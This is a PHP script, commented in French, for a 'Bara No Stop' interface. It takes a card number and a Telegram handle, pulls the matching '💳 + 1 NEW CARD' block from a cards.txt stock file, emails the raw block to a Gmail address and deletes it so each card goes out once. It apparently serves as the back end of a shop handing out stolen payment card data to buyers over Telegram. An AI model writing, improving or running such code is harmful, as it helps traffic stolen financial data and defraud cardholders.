<?php
// demande.php
// Reçoit JSON { idx, number, telegram }
// Envoie mail à baranostop28@gmail.com et supprime le bloc correspondant dans cards.txt

header('Content-Type: application/json; charset=utf-8');

// Répondre et finir en renvoyant JSON
function respond($ok, $msg = '') {
    echo json_encode(['success' => $ok, 'message' => $msg], JSON_UNESCAPED_UNICODE);
    exit;
}

$raw = file_get_contents('php://input');
if (!$raw) respond(false, 'Pas de données reçues.');

$data = json_decode($raw, true);
if (!$data) respond(false, 'JSON invalide.');

$number = isset($data['number']) ? preg_replace('/\\D+/', '', $data['number']) : '';
$telegram = isset($data['telegram']) ? trim($data['telegram']) : '';

if (!$number || strlen($number) < 12) respond(false, 'Numéro de carte invalide.');
if (!$telegram) respond(false, 'Pseudo Telegram manquant.');

// assure un @ devant le pseudo
if ($telegram[0] !== '@') $telegram = '@' . $telegram;

// path du fichier
$path = __DIR__ . '/cards.txt';
if (!file_exists($path) || !is_writable($path)) {
    respond(false, 'cards.txt introuvable ou non inscriptible. Vérifie permissions.');
}

// Lire le fichier
$content = file_get_contents($path);

// Trouver les blocs qui commencent par "💳 + 1 NEW CARD"
$blocks = preg_split('/(?=💳\\s*\\+\\s*1\\s*NEW\\s*CARD)/iu', $content);

// Chercher la première occurrence d'un bloc contenant exactement le numéro (séquence de chiffres)
$foundIndex = -1;
for ($i = 0; $i < count($blocks); $i++) {
    if (preg_match('/' . preg_quote($number, '/') . '/', $blocks[$i])) {
        $foundIndex = $i;
        break;
    }
}

if ($foundIndex === -1) {
    respond(false, 'Carte introuvable (peut-être déjà demandée).');
}

// Extraire le bloc ciblé complet
$targetBlock = $blocks[$foundIndex];

// Préparer le mail — on enverra seulement la carte demandée + pseudo Telegram
$to = 'baranostop28@gmail.com';
$subject = 'Demande de carte';
$body = "Une carte a été demandée par Telegram: $telegram\n\n";
$body .= "Bloc carte (brut):\n\n" . $targetBlock . "\n\n";
$body .= "-----\nEnvoyé depuis l'interface Bara No Stop\n";

// En-têtes simples
$headers = "From: noreply@baranostop.local\r\n";
$headers .= "Content-Type: text/plain; charset=UTF-8\r\n";

// Essayer d'envoyer le mail
$mailOk = @mail($to, $subject, $body, $headers);

// Si l'envoi échoue on peut toujours continuer (mais avertir)
if (!$mailOk) {
    // on peut continuer mais prévenir
    $mailWarning = "Erreur envoi e-mail (mail() a retourné false). Vérifie la configuration SMTP.";
} else {
    $mailWarning = "";
}

// Supprimer la première occurrence du bloc ciblé dans $content
// Pour être sûr, remplaçons seulement la première occurrence exacte du bloc
$escaped = preg_quote($targetBlock, '/');
$newContent = preg_replace('/' . $escaped . '/', '', $content, 1);

// Sauvegarder le fichier (écriture atomique)
$tmpPath = $path . '.tmp';
if (file_put_contents($tmpPath, $newContent) === false) {
    respond(false, 'Impossible d\'écrire le fichier temporaire.');
}
if (!rename($tmpPath, $path)) {
    respond(false, 'Impossible de remplacer cards.txt.');
}

// Répondre succès
$msg = 'Demande envoyée.';
if ($mailWarning) $msg .= ' ' . $mailWarning;
respond(true, $msg);
